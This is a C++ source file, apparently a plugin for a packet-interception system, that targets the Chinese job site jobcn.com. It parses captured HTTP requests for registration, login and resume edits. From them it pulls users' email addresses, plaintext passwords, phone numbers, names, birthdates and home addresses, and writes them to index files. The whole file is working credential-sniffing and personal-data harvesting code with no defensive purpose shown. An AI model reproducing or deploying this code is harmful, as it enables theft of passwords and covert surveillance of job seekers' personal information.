#include "StdAfx.h"
#include "EmployZhuoBo.h"

employ::ZhuoBo::ZhuoBo(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "卓博人才网";
}

employ::ZhuoBo::~ZhuoBo()
{
	
}

int employ::ZhuoBo::IsZhuoBo(HttpSession *http_session)
{
	//注册(邮箱注册)
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/register_action")!=-1) )
	{
		return kPcWebRegisterEmail;
	}
	//登录
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/login_action")!=-1) )
	{
		return kPcWebLogin;
	}
	//修改个人信息
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/resume/edit.ujson")!=-1) )
	{
		return kPCWebModiy;
	}
	return 0;
}

int employ::ZhuoBo::Process(const char *packet,int action)
{
	//注册(邮箱注册)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//修改个人信息
	if (action==kPCWebModiy)
	{
		return PCWebModiy(packet);
	}
	return 1;
}

//注册(邮箱注册)
int employ::ZhuoBo::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//用户名
	string email = ms_->GetValueFromMapByKey("email",true);
	//密码
	string password = ms_->GetValueFromMapByKey("password",true);
	//手机号
	string phone = ms_->GetValueFromMapByKey("mobileNum",true);
	if (email.empty() || password.empty() || phone.empty())
	{
		return 0;
	}
	output_text_ =
		"mid=" + email + "\r\n" + 		//邮箱		
		"pass=" + password + "\r\n" + 	//密码	
		"oid=" + phone + "\r\n" + 		//手机号	
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=注册\r\n";
	WriteIndexFile();
	return 1;
}

//登录
int employ::ZhuoBo::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
    string UserName = ms_->GetValueFromMapByKey("userName",true);
	//密码
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//账号		
		"pass=" + Password + "\r\n" + 	//密码
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

int employ::ZhuoBo::PCWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	src_data = src_data.substr(src_data.find("base=")+strlen("base="));
	Json::Value vale;
	Json::Reader reader;
	if (reader.parse(src_data,vale))
	{
		//姓名
		string name = vale["name"].asString();
		//性别
		string gender = vale["sex"].asString();
		if(gender == "1"){gender = "男";}
		if(gender == "2"){gender = "女";}
		//出生日期
		string birth = vale["birthday"].asString();
		//居住地
		string address = vale["locationPC"].asString() + vale["address"].asString() ;
		//手机号
		string mobile = vale["mobile"].asString();
		//邮箱
		string email = vale["email"].asString();
		if (name.empty() || gender.empty() || birth.empty() || address.empty() || mobile.empty() || email.empty())
		{
			return 0;
		}
		output_text_=
			"servername=" + name + "\r\n" + //姓名	        
			"sex=" + gender + "\r\n" + 		//性别	
			"msg=" + birth + "\r\n" + 		//出生日期
			"oid=" + mobile + "\r\n" + 		//手机号	
			"mid=" + email + "\r\n" + 		//邮箱	
			"nick="	+ address + "\r\n" + 	//地址	
			"netmark=" + app_ + "\r\n" + 	//来源
			"state=修改基本信息\r\n";  
		WriteIndexFile();
	}
	return 1;
}